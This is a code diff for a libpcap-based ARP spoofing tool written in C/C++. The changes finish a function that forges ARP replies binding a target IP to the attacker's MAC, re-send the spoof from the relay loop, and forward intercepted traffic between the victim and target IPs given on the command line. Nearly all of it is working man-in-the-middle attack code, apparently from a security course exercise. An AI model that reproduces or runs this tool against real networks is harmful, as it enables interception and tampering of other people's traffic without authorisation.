@@ -126,7 +126,7 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
     }
 }
 
-bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet,char* dev,char* target) {
+bool sendArpSpoof(pcap_t* handle,const char* dev,char* sender,char* target) {
 
     EthArpPacket myPacket;
 
@@ -134,8 +134,10 @@ bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet,char* dev,char* target) {
 
     // Get network information
     if(getMyIp(dev,myPacket)==-1){
-        return -1;
+        return false;
     }
+
+
 
 	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
 	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
@@ -149,36 +151,62 @@ bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet,char* dev,char* target) {
 	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
 	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
 	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	myPacket.arp_.tip_ = htonl(Ip(target));
+	myPacket.arp_.tip_ = htonl(Ip(sender));
 
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    unsigned char *mymac = getMyMac(dev);
+    if (mymac==NULL){
+        return false;
+    }
+    memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
+    memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);
+
+
+    if (!getSenderMac(handle, myPacket)) {
+        printf("Failed to get sender MAC address.\n");
+        return false;
+    }
+
+    // ARP spoof target
+    myPacket.arp_.sip_ = htonl(Ip(target));
+    myPacket.arp_.op_ = htons(ArpHdr::Reply);
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&myPacket), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         return false;
     }
+    printf("Spoofed ARP of target %s.\n", target);
     return true;
 
 }
 
-bool check_spoofed(const u_char *packet) {
-    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)(packet);
-    struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
+bool check_spoofed(pcap_t* handle) {
+    struct pcap_pkthdr header; 
+    const u_char *packet;
 
-    // If it's not an IPv4 packet, exit the function
-    if(ntohs(eth_hdr->ether_type) != ETHERTYPE_IP)
+    packet = pcap_next(handle, &header);
+    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)(packet);
+    struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
+
+    // If it's not an ARP packet, exit the function
+    if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
         return false;
 
-    // Convert IP addresses from binary to string
+    // Check for broadcast
+    const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    if (memcmp(eth_hdr->ether_dhost, broadcast_mac, sizeof(broadcast_mac)) != 0) {
+        return false;
+    }
+
+
     char ip[INET_ADDRSTRLEN];
-    inet_ntop(AF_INET, &(ip_hdr->ip_src), ip, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, (packet + LIBNET_ETH_H + LIBNET_ARP_H), ip, INET_ADDRSTRLEN);
     std::string ip_str(ip);
 
-    // Convert MAC addresses from binary to string
     char mac[18];
-    snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", eth_hdr->ether_dhost[0], eth_hdr->ether_dhost[1], eth_hdr->ether_dhost[2], eth_hdr->ether_dhost[3], eth_hdr->ether_dhost[4], eth_hdr->ether_shost[5]);
+    snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", eth_hdr->ether_shost[0], eth_hdr->ether_shost[1], eth_hdr->ether_shost[2], eth_hdr->ether_shost[3], eth_hdr->ether_shost[4], eth_hdr->ether_shost[5]);
     std::string mac_str(mac);
 
-    // If the IP is already mapped to a MAC, and it's a different MAC, we have an ARP spoofing issue
     if (ip_to_mac.find(ip_str) != ip_to_mac.end() && ip_to_mac[ip_str] != mac_str) {
         printf("ARP Spoofing Detected! Original MAC: %s, New MAC: %s\n", ip_to_mac[ip_str].c_str(), mac_str.c_str());
         return true;
@@ -189,8 +217,7 @@ bool check_spoofed(const u_char *packet) {
 
     return false;
 }
-
-void relay_packet(pcap_t* handle,const char* dev) {
+void relay_packet(pcap_t* handle,const char* dev,char* sI,char* tI) {
     struct pcap_pkthdr* header;  // header pcap gives us
     const u_char *packet;       // actual packet
 
@@ -203,10 +230,16 @@ void relay_packet(pcap_t* handle,const char* dev) {
         //Ip packet parsing
         // check Eth_type -> if ipv4 -> relay
         struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
-
+        struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));
+        char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
         if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;
-
+        inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
+        inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
+        if (strcmp(src_ip, sI) != 0) continue;
+        printf("pass!\n");
+        if (strcmp(dst_ip, tI) != 0) continue;
         // modify smac to mine (attacker)
+        printf("pass2!\n");
         unsigned char *m_mac= getMyMac(dev);
         if (m_mac == NULL) {
             fprintf(stderr, "Could not get MAC address.\n");
@@ -218,11 +251,12 @@ void relay_packet(pcap_t* handle,const char* dev) {
         // -2-2) sip check (against my ip)
         // -2-3) dip check (my ip)
         //  if not? spoofing and continue
-        if(check_spoofed(packet)==true){
+        if(check_spoofed(handle)==true){
             printf("spoofed\n");
         }
         else{
             printf("no spoofed\n");
+            sendArpSpoof(handle,dev,sI,tI);
         }
         
         memcpy(eth_hdr->ether_shost, m_mac, 6);
@@ -246,6 +280,8 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
     char* dev = argv[1];
+    char *senderIp=argv[2];
+    char *targetIp=argv[3];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
@@ -272,35 +308,10 @@ int main(int argc, char* argv[]) {
 	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
 
     // Get network information
-/*     if(getMyIp(dev,myPacket)==-1){
-        return -1;
-    } */
     
-    relay_packet(handle,dev);
+    sendArpSpoof(handle,dev,senderIp,targetIp);
+    relay_packet(handle,dev,senderIp,targetIp);
 
-/*     unsigned char *mymac = getMyMac(dev);
-    if (mymac==NULL){
-        return -1;
-    }
-    memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
-    memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);
-
-
-    if (!getSenderMac(handle, myPacket)) {
-        printf("Failed to get sender MAC address.\n");
-        return -1;
-    }
-
-    // ARP spoof target
-    myPacket.arp_.sip_ = htonl(Ip(argv[3]));
-    myPacket.arp_.op_ = htons(ArpHdr::Reply);
-    while(1){
-    	if (!sendArpSpoof(handle, myPacket)) {
-        	printf("Failed to send ARP spoofing packet.\n");
-       		return -1;
-    	}
-    }
-    printf("Spoofed ARP of target %s.\n", argv[3]); */
 
     pcap_close(handle);
     return 0;
